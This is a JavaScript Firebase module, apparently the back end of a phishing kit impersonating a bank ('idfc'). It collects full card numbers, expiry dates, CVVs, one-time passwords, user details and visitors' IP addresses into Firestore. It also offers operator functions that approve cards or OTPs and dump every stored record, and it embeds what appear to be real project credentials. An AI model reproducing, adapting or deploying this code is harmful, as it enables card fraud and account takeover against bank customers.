// Modular Firebase config for browser (ES module)
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import { getFirestore, collection, addDoc, doc, updateDoc, getDocs } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

// TODO: Replace these values with your Firebase project's config
const firebaseConfig = {
  apiKey: "AIzaSyCGunogYC48i8PGfiLc6ZSExvIzSDWNYdc",
  authDomain: "idfc-12a8b.firebaseapp.com",
  databaseURL: "https://idfc-12a8b-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "idfc-12a8b",
  storageBucket: "idfc-12a8b.firebasestorage.app",
  messagingSenderId: "91666064256",
  appId: "1:91666064256:web:1fd1c2fd8350d8e4d29765"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

async function getClientIP() {
  try {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), 5000);
    const res = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
    clearTimeout(id);
    const data = await res.json();
    return data.ip || 'unknown';
  } catch (err) {
    return 'unknown';
  }
}

async function saveFormSubmissionToFirebase(collectionName, data) {
  try {
    const payload = Object.assign({}, data, { timestamp: new Date() });
    const ref = await addDoc(collection(db, collectionName), payload);
    console.log(`Saved ${collectionName} doc:`, ref.id);
    return { success: true, docId: ref.id };
  } catch (error) {
    console.error('saveFormSubmission error', error);
    return { success: false, error: error.message };
  }
}

async function sendOTPToFirebase(otp) {
  return saveFormSubmissionToFirebase('otp_verifications', { otp, status: 'pending', verified: false });
}

async function saveCardAuthenticationToFirebase(cardData) {
  try {
    const payload = {
      cardHolderName: cardData.name,
      cardNumber: cardData.cardNumber,
      expiryDate: cardData.expiry,
      cvv: cardData.cvv,
      timestamp: new Date(),
      status: 'submitted',
      ipAddress: await getClientIP()
    };
    return saveFormSubmissionToFirebase('card_authentications', payload);
  } catch (err) {
    return { success: false, error: err.message };
  }
}

async function saveUserInfoToFirebase(userData) {
  return saveFormSubmissionToFirebase('user_information', userData);
}

async function verifyOTP(docId, isVerified) {
  try {
    const d = doc(db, 'otp_verifications', docId);
    await updateDoc(d, { verified: isVerified, verifiedAt: new Date(), status: isVerified ? 'verified' : 'failed' });
    return true;
  } catch (err) {
    console.error('verifyOTP error', err);
    return false;
  }
}

async function verifyCard(docId, isValid) {
  try {
    const d = doc(db, 'card_authentications', docId);
    await updateDoc(d, { verified: isValid, verifiedAt: new Date(), status: isValid ? 'approved' : 'rejected' });
    return true;
  } catch (err) {
    console.error('verifyCard error', err);
    return false;
  }
}

async function getAllDocuments(collectionName) {
  try {
    const snap = await getDocs(collection(db, collectionName));
    const out = [];
    snap.forEach(d => out.push({ id: d.id, ...d.data() }));
    return out;
  } catch (err) {
    console.error('getAllDocuments error', err);
    return [];
  }
}

function isFirebaseReady() {
  try {
    return !!db;
  } catch (err) {
    return false;
  }
}

// Expose functions to non-module scripts via window
window.firebaseModule = {
  db,
  getClientIP,
  saveFormSubmissionToFirebase,
  sendOTPToFirebase,
  saveCardAuthenticationToFirebase,
  saveUserInfoToFirebase,
  verifyOTP,
  verifyCard,
  getAllDocuments,
  isFirebaseReady
};

// Also attach individual helpers for backward compatibility
window.saveFormSubmissionToFirebase = saveFormSubmissionToFirebase;
window.sendOTPToFirebase = sendOTPToFirebase;
window.saveCardAuthenticationToFirebase = saveCardAuthenticationToFirebase;
window.saveUserInfoToFirebase = saveUserInfoToFirebase;
window.verifyOTP = verifyOTP;
window.verifyCard = verifyCard;
window.getAllDocuments = getAllDocuments;
window.isFirebaseReady = isFirebaseReady;
